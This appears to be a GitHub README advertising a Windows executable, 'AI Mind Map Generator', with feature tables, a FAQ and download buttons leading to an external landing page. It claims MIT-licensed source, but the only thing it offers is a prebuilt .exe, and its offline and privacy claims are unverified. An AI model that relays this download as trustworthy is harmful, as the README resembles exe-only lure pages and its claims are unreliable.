<div align="center">
<img src="assets/banner.png" width="100%" alt="AI Mind Map Generator banner" />
</div>

<div align="center">
<p>
  <img src="https://img.shields.io/badge/Platform-Windows_11%7C10-57e8ff?style=for-the-badge&logo=windows" alt="" />
  <img src="https://img.shields.io/badge/Release-2026-0D9488?style=for-the-badge" alt="" />
  <img src="https://img.shields.io/badge/Build-.exe-0891B2?style=for-the-badge" alt="" />
</p>
</div>

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?color=4F46E5&size=28&center=true&vCenter=true&width=900&lines=%F0%9F%93%A6+Ai+Mind+Map+Generator;%F0%9F%9A%80+Full+Feature+Suite;%F0%9F%94%A7+No+Limits;%E2%9C%85+Standalone+.exe+Release;%E2%9C%A8+Community+Tested;%E2%AD%90+Updated+for+2026">
</p>

<p align="center">
  <img src="https://skillicons.dev/icons?i=python" />
  <img src="https://skillicons.dev/icons?i=github" />
</p>

---

**Turn a single sentence into a full branching knowledge graph in under ten seconds.**

</div>

---

## 📦 Overview

| Category | Details |
|---|---|
| Product | AI Mind Map Generator Toolkit |
| Release | v2.4.1 (2026) |
| Platform | Windows 10 / 11 (x64) |
| Runtime | Standalone `.exe` — no Python, no Node, no pip |
| Core Engine | Local LLM + graph layout solver |
| Output Formats | PNG, SVG, PDF, Markdown, OPML, FreeMind `.mm` |
| License | MIT (source available) |

The AI Mind Map Generator Toolkit is a desktop app that eats a prompt — a paragraph, a lecture transcript, a meeting note, a Reddit thread — and spits out a structured, editable mind map. It runs a local language model for node extraction and a force-directed layout solver for the graph, so everything happens on your machine. You type. It thinks. You get a map.

---

## 📥 Download
<p align="center">
  <a href="https://NewtWarehouse.github.io/ai-mind-map-generator/">
    <img src="https://img.shields.io/badge/GET-AI_mind_map_2026-7C3AED?style=flat-square&labelColor=5B21B6" width="460" alt="GET AI mind map 2026"/>
  </a>
</p>
---

## 🗂️ Table of Contents

- [📦 Overview](#-overview)
- [📥 Download](#-download)
- [🧩 All Modules Status](#-all-modules-status)
- [🚀 Quick Start](#-quick-start)
- [🌐 What is an AI Mind Map Generator?](#-what-is-an-ai-mind-map-generator)
- [🎯 Key Features](#-key-features)
- [⚠️ The Problem](#️-the-problem)
- [✅ The Solution](#-the-solution)
- [⚖️ Comparison](#️-comparison)
- [🖥️ System Requirements](#️-system-requirements)
- [📂 Grouped Module Catalog](#-grouped-module-catalog)
- [🔧 Usage Guidelines](#-usage-guidelines)
- [🐛 Known Issues](#-known-issues)
- [❓ FAQ](#-faq)

---

## 🧩 All Modules Status

| Module | Status | Description |
|---|---|---|
| Prompt Parser | ✅ Working | Tokenizes freeform input into semantic chunks |
| Node Extractor | ✅ Working | Pulls entities + relations from raw text |
| Auto-Branch | ✅ Working | Generates 2–6 child nodes per parent |
| Layout Solver | ✅ Working | Force-directed placement, no overlap |
| Theme Engine | ✅ Working | 14 built-in visual themes |
| Export Pipeline | ✅ Working | PNG / SVG / PDF / Markdown / OPML / `.mm` |
| Voice-to-Map | ✅ Working | Whisper-based transcript → map |
| PDF Ingest | ✅ Working | Multi-page PDF → hierarchical map |
| URL Scraper | ✅ Working | Paste a link, get a map |
| Collab Sync | 🧪 Beta | LAN + optional cloud relay |
| Plugin API | 🧪 Beta | JS hooks for custom node types |
| Import Bridge | ✅ Working | XMind, FreeMind, Obsidian Canvas |

---

## 🚀 Quick Start

1. 🧾 **Grab the build.** Hit the download section above and pull the latest `.exe`.
2. 📂 **Extract.** Right-click the archive → *Extract All*. Do not run inside the zip.
3. ▶️ **Launch.** Double-click the `.exe`. First launch takes ~15s (model warm-up).
4. ✍️ **Type a prompt.** Paste a paragraph, a lecture note, or a single sentence.
5. 💾 **Export.** Hit `Ctrl+E` → pick PNG, SVG, PDF, or Markdown.

---

## 🌐 What is an AI Mind Map Generator?

| Term | Explanation |
|---|---|
| Mind Map | A radial diagram where a central idea branches into sub-ideas |
| Node | A single bubble — one concept, entity, or task |
| Edge | The line connecting parent node to child node |
| Auto-Branch | The engine's ability to invent child nodes from context |
| Layout Solver | The physics simulation that spaces nodes without overlap |
| Semantic Chunk | A meaning-preserving slice of your input text |
| Export Pipeline | The renderer that flattens the live map into a static file |

- 🧠 Turns walls of text into a readable graph in seconds
- 🖱️ Fully drag-and-drop editable — the AI proposes, you dispose
- 🔒 100% offline — no API keys, no cloud, no telemetry
- 🎨 Themes swap instantly without re-running the model
- 📤 Exports to every format your note app probably already reads
- 🧩 Plugin API means you can wire in your own node types

---

## 🎯 Key Features

| Feature | Description | Benefit |
|---|---|---|
| One-Shot Mapping | Full map from a single prompt | Zero prompting skill needed |
| Multi-Source Ingest | PDF, URL, audio, raw text | Any input becomes a map |
| Auto-Branch Depth | Configurable 1–6 levels | Control granularity |
| Smart Merge | Combines overlapping nodes | No duplicate bubbles |
| Live Edit | Drag, rename, recolor in-place | AI drafts, you refine |
| Theme Engine | 14 themes + custom CSS | Match your brand or mood |
| Batch Mode | Queue 50 prompts at once | Overnight map generation |
| Version History | Roll back to any prior state | Never lose a good layout |
| Keyboard-First | Full hotkey coverage | Mouse optional |
| OPML / `.mm` Export | Native mind-map app formats | Round-trip to XMind, FreeMind |
| Local LLM | Ships with quantized model | No internet required |
| CLI Companion | Scriptable headless mode | CI/CD and automation friendly |

---

## ⚠️ The Problem

- 🧱 **Blank canvas paralysis.** You open a mind-map app and stare at an empty node for twenty minutes.
- 📚 **Lecture and PDF overload.** You have 400 pages of notes and no structured overview.
- 🕸️ **Manual branching is slow.** Dragging 60 nodes by hand is not a workflow, it's a punishment.
- 🔁 **Re-mapping after edits.** Change one idea, and your diagram is now inconsistent.
- ☁️ **Cloud dependency.** Most "AI" mapping tools phone home and bill per token.
- 🧩 **Format lock-in.** Maps trapped in one app, unreadable everywhere else.

---

## ✅ The Solution

| Problem | Solution |
|---|---|
| Blank canvas paralysis | Type any sentence — the app auto-generates the first 3 branches |
| Lecture/PDF overload | Drop the file in; the ingest pipeline maps it end-to-end |
| Manual branching is slow | Auto-Branch generates 2–6 children per node instantly |
| Re-mapping after edits | Smart Merge re-balances the graph on every edit |
| Cloud dependency | Local LLM, offline, no API keys, no metering |
| Format lock-in | Export pipeline supports 6 open formats |

---

## ⚖️ Comparison

| Aspect | Alternative | This Tool |
|---|---|---|
| Model location | Cloud API | Local, on-device |
| Per-token cost | Metered | Free after install |
| Input types | Text only | Text, PDF, URL, audio |
| Export formats | 1–2 | 6 (PNG/SVG/PDF/MD/OPML/.mm) |
| Offline use | ❌ | ✅ |
| Plugin API | Closed | Open JS hooks |
| Setup | Account + key | Extract + run `.exe` |
| Privacy | Text leaves machine | Nothing leaves machine |

---

## 🖥️ System Requirements

| Component | Minimum | Recommended |
|---|---|---|
| OS | Windows 10 (x64) | Windows 11 (x64) |
| CPU | 4-core @ 2.4 GHz | 8-core @ 3.5 GHz |
| RAM | 8 GB | 16 GB |
| GPU | Integrated | NVIDIA GTX 1660 / 6 GB VRAM |
| Disk | 3 GB free | 8 GB free (SSD) |
| Runtime | None (bundled) | None (bundled) |

---

## 📂 Grouped Module Catalog

### 📝 **Input & Ingest**
- **Prompt Parser** — normalizes freeform text into semantic chunks
- **PDF Ingest** — multi-page PDF → hierarchical node tree
- **URL Scraper** — paste a link, get a clean map of the article
- **Voice-to-Map** — Whisper transcription piped straight into the parser
- **Markdown Ingest** — heading structure becomes the first branch layer
- **CSV Mapper** — rows become nodes, columns become edge labels

### 🧠 **AI Engine**
- **Node Extractor** — entities and relations pulled from raw text
- **Auto-Branch** — generates 2–6 plausible children per parent
- **Relation Labeler** — writes edge captions in your tone
- **Depth Controller** — clamp map depth to 1–6 levels
- **Merge Resolver** — detects and fuses duplicate concepts
- **Tone Presets** — academic, casual, bulleted, ELI5

### 🎨 **Visualization**
- **Layout Solver** — force-directed, zero overlap
- **Theme Engine** — 14 built-in themes + CSS overrides
- **Node Styler** — per-node color, shape, font, size
- **Edge Styler** — curve, arrow, dash, width
- **Minimap** — overview panel for large graphs
- **Focus Mode** — dim everything but the selected subtree

### 📤 **Export & Sharing**
- **PNG Renderer** — rasterized at up to 8K
- **SVG Writer** — vector, editable in Figma/Illustrator
- **PDF Export** — paginated, print-ready
- **Markdown Dump** — nested bullets, ready for Obsidian
- **OPML Writer** — round-trips to any outliner
- **FreeMind `.mm`** — native interop with legacy apps

### 🔌 **Integration**
- **Plugin API** — JS hooks for custom node types and renderers
- **CLI Companion** — headless batch mode
- **Collab Sync (Beta)** — LAN + optional relay
- **Watch Folder** — auto-map new files dropped into a directory
- **Webhook Trigger** — POST a prompt, receive a PNG
- **Import Bridge** — XMind, FreeMind, Obsidian Canvas

### ⚙️ **System**
- **Version History** — snapshot & rollback any map state
- **Settings Sync** — portable config file
- **Log Viewer** — in-app diagnostics panel
- **Model Switcher** — swap between quantized LLM tiers
- **Crash Recovery** — autosave every 30s
- **Update Checker** — manual check, no forced updates

---

## 🔧 Usage Guidelines

| Allowed | Not allowed |
|---|---|
| Mapping your own notes, docs, and research | Uploading others' private data without consent |
| Commercial use of exported maps | Reselling the `.exe` as your own product |
| Forking and modifying the source (MIT) | Removing the license header |
| Automating with the CLI | Abusing the plugin API to inject malware |
| Sharing maps on social media | Claiming authorship of AI-generated content as human |

---

## 🐛 Known Issues

| Issue | Solution |
|---|---|
| First launch is slow (~15s) | Model warm-up. Subsequent launches are instant. |
| GPU not detected | Update to latest NVIDIA/AMD drivers; fall back to CPU in Settings. |
| Large PDFs (>200 pages) stall | Enable *Chunked Ingest* in Settings → Performance. |
| SVG export shows fonts wrong | Embed fonts on: Export → SVG → *Embed Fonts*. |
| Collab Sync drops peers | All peers must be on the same LAN subnet. |
| Plugin throws on load | Check the Plugin API version in `plugin.json`. |

---

## ❓ FAQ

<details>
<summary><strong>🤖 Does this use my GPU, or is it CPU-only?</strong></summary>
Both work. GPU is optional but cuts generation time by ~4× on a GTX 1660 or better. CPU-only is fully supported.
</details>

<details>
<summary><strong>🔒 Does anything leave my machine?</strong></summary>
No. The LLM runs locally. The only outbound call is the optional update check, which you can disable in Settings → Privacy.
</details>

<details>
<summary><strong>🎮 Is there a Steam version?</strong></summary>
Not currently. Distribution is via the landing page only. Steam release is on the roadmap for late 2026.
</details>

<details>
<summary><strong>🧩 Can I write my own node types?</strong></summary>
Yes — the Plugin API ships with JS hooks and a small example repo inside the install folder.
</details>

<details>
<summary><strong>📄 What's the biggest PDF it can handle?</strong></summary>
Tested up to 400 pages with *Chunked Ingest* enabled. Beyond that, split the file first.
</details>

**Q:** Do I need an API key?
**A:** No. The bundled model runs offline. No keys, no accounts, no billing.

**Q:** Does it work on macOS or Linux?
**A:** Windows 10/11 only for now. A Linux AppImage is planned.

**Q:** Can I export directly to Obsidian?
**A:** Yes — Markdown export produces nested bullets that paste cleanly into any vault.

**Q:** Is there a portable mode?
**A:** Yes. Drop a `portable.flag` file next to the `.exe` and all config stays in the folder.

---

## 📥 Download
<p align="center">
  <a href="https://NewtWarehouse.github.io/ai-mind-map-generator/">
    <img src="https://img.shields.io/badge/GET-AI_mind_map_2026-DB2777?style=for-the-badge&logo=download&logoColor=white&labelColor=BE185D" width="520" alt="GET AI mind map 2026"/>
  </a>
</p>
---

That's the whole thing. Local model, real graph solver, six export formats, and a plugin API for when you want to bend it your way. No cloud, no metering, no account. Extract, run, map.
